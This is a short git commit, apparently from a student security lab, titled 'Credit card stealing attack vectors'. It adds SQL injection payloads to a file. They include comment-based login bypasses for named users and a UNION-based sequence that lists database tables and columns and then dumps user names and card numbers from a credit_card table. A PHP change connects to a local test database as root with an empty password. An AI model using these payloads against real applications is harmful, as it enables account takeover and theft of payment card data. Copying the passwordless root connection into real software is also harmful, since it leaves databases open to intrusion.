b6b5d6a95cb2f3c357a716ddeb872d2c005e22ca
Aryan Sharma <arshar1204@gmail.com>
2023-04-15 16:16:01 +0800

    Credit card stealing attack vectors

--- attach.sql
+++ attach.sql
@@ -2,3 +2,7 @@
 %'-- ' (dump entire table as uname)
 aryan'-- ' (get access to aryan as uname)
 agnes'-- ' (get access to agnes as uname)
+%' UNION (SELECT 1, 2, 3 FROM dual) -- ' (output queries to the screen as uname)
+%' UNION (SELECT 3, TABLE_NAME, TABLE_SCHEMA FROM information_schema.tables) -- ' (get table names as uname)
+%' UNION (SELECT 2, COLUMN_NAME, 3 FROM information_schema.columns WHERE TABLE_NAME='credit_card') -- ' (get credit card column name as uname)
+%' UNION (SELECT id, user_name, cNum FROM credit_card) -- ' (get credit card info as uname)
--- db_conn.php
+++ db_conn.php
@@ -5,7 +5,7 @@ $unmae = "root";
 $pass = "";
 $db_name = "test_db";
 
-$conn = mysqli_connect($sname, $uname, $pass, $db_name);
+$conn = mysqli_connect($sname, $unmae, $pass, $db_name);
 
 if(!$conn) {
     echo "Connection failed";
